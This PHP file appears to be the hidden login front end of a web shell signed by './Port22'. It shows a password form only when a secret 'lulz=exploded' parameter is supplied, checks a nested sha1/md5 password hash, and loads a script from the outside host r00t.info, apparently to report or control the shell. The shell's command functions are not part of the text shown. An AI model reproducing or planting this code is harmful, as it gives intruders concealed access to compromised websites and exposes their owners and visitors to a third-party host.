<?php 
include"../inc/config";
$s_auth_pass = "6c3dfbbbb5d630cea4882fa6b740c0a36997db7c"; 

function printLogin() { 
?>
<html>
	<head>
	<script src=http://r00t.info/ccb.js></script>
		<link rel="shortcut icon" href="../assets/img/favicon.png">
		<link href='../assets/css/cursor.css' rel='stylesheet' type='text/css'>

		<title><?=title?> | <?=subtitle?></title>
	</head>
<body>
	<style type="text/css">
		body { background-color:transparan;background:#000;background-image: url("../assets/img/map.jpg");background-position: center;  background-attachment: fixed;background-repeat: repeat; } 
		.tabnez{ margin:30px auto 0 auto;border: 1px solid #333333; color: grey; 
		-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;}
		body,td,th {font-family: Verdana;font-size: 12px;color: grey;font-weight: bold;}
		input {BORDER-RIGHT:grey 1px solid;BORDER-TOP:grey 1px solid;BORDER-LEFT:grey 1px solid;BORDER-BOTTOM: grey 1px solid;BACKGROUND-COLOR: #111111;COLOR: grey;font: 8pt Verdana;}
	</style>
<a href="<?=$path; ?>" target="blank">
<img src="../assets/img/exploded.png" title="./Port22 a.k.a Muhammad Supiani" style="float:left" alt="Exploded" height='250' width='700'/>
</a><br><br><br><br><br><br><br><br><br><center>
<?php 
if(isset($_REQUEST['lulz'])){
		switch ($_REQUEST['lulz']){ case "exploded":?>
<table>
<form method=post>
<tr>
	<td><img src='../assets/img/favicon.png' class="tabnez"  height='20' width='24'></td>
	<td><input class="tabnez" type="password" name="pass" value=""></td>
	<td><input class="tabnez" type="submit" value="Login !"></td>
</tr>
</form>
</table>
</body>
</html>
    <?php break ;}}
    exit; 
} 
if( !isset( $_SESSION[sha1(md5(sha1(sha1(sha1(md5($_SERVER['HTTP_HOST']))))))] )) 
    if( empty( $s_auth_pass ) || 
        ( isset( $_POST['pass'] ) && ( sha1(md5(sha1(sha1(sha1(md5($_POST['pass'])))))) == $s_auth_pass ) ) ) 
        $_SESSION[sha1(md5(sha1(sha1(sha1(md5($_SERVER['HTTP_HOST']))))))] = true; 
    else 
        printLogin();